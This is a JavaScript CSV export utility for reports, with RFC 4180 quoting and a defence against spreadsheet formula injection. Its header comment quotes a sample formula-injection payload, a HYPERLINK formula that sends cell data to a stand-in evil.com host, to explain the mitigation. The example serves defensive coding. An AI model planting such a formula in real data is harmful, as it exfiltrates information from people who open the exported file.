/*
  Generic CSV export, reused by every report. Handles quoting fields
  that contain commas, quotes, or newlines (RFC 4180 style: wrap in
  double quotes, escape internal quotes by doubling them).

  SECURITY: also guards against CSV/formula injection. Report data
  (client names, vendor names, descriptions, reference numbers, ...)
  is user-controlled and written into these files unmodified — a
  value starting with =, +, -, or @ is interpreted as a live formula
  by Excel/Sheets when the exported file is opened (e.g. a client
  name of '=HYPERLINK("http://evil.com?"&A1)' could exfiltrate data,
  or worse with older DDE-capable Excel versions). Prefixing a single
  quote is the standard mitigation: spreadsheet apps then render the
  cell as literal text instead of evaluating it.
*/
function csvEscape(value) {
  if (value === null || value === undefined) return '';
  let str = String(value);
  if (/^[=+\-@]/.test(str)) {
    str = `'${str}`;
  }
  if (/[",\n]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

/**
 * @param {Array<object>} rows
 * @param {Array<{key:string, label:string}>} columns
 * @param {string} filename - without extension
 */
export function exportToCsv(rows, columns, filename) {
  const header = columns.map((c) => csvEscape(c.label)).join(',');
  const lines = rows.map((row) => columns.map((c) => csvEscape(row[c.key])).join(','));
  const csvContent = [header, ...lines].join('\r\n');

  // Leading BOM so Excel opens UTF-8 (e.g. ₹, GSTINs with non-ASCII) correctly.
  const blob = new Blob(['\uFEFF' + csvContent], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `${filename}.csv`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(() => URL.revokeObjectURL(url), 2000);
}
